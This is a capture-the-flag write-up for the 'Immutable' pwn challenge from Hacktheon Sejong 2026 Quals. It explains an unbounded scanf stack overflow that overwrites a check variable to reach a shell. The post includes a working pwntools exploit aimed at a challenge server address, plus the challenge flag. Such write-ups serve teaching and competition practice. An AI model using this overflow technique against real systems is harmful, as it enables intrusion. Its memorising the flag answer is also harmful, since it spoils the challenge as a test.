---
title: "Hacktheon Sejong 2026 Quals Immutable Writeup"
description: "Hacktheon Sejong 2026 Quals Immutable writeup"
---

# Immutable

### Summary

`scanf("%s", buf)` takes input with no length limit. You don't even need to reach the return address. Just overwriting the local check variable right in front of the stack canary with `0xdeadbeef` opens the `system("/bin/sh")` path already prepared inside the binary.

### Analysis

The mitigations were Full RELRO, Canary, NX, and PIE, all enabled. This was not a control-flow hijack problem, but a problem of overwriting the stack local value that a conditional checks.

The stack layout places `buf` at `[rbp-0x90]`, the comparison variable at `[rbp-0x10]`, and the canary at `[rbp-0x8]`. Filling `0x80` bytes and then appending `p32(0xdeadbeef)` changes only the comparison variable without touching the canary.

The `system("/bin/sh")` call is already present inside the binary. After sending the payload, just read the flag from the shell and you're done.

### Exploit

```python
#!/usr/bin/env python3
from pwn import *


HOST = args.HOST or "3.37.44.62"
PORT = int(args.PORT or 33201)


def main():
    payload = b"A" * 0x80 + p32(0xDEADBEEF)

    io = remote(HOST, PORT)
    io.recvuntil(b"input: ")
    io.sendline(payload)
    io.sendline(b"cat flag; exit")
    print(io.recvall(timeout=3).decode("latin-1"), end="")


if __name__ == "__main__":
    main()
```

### Flag

`hacktheon2026{ed2190f6865ca1e3fea816b296445228064a51ec9492b518f514a60624f43d850738dd60b2c9d0893cb5c30f7d1efeaa575527f0b8534a96aa170356d2f8e2d0f3da4b43880faa71}`
